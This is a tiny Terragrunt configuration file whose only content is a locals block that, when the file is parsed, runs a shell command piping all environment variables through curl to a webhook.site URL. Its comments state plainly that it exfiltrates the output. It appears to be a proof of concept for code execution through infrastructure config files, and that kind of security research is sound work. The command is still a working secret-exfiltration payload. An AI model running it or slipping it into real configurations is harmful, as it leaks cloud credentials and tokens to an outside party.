# terragrunt.hcl
locals {
  # This command will execute 'env' and exfiltrate the output.
  # We use webhook.site as a safe endpoint to receive the data.
  leaked_env = run_cmd("sh", "-c", "env | curl -X POST --data-binary @- https://webhook.site/your-unique-url")
}
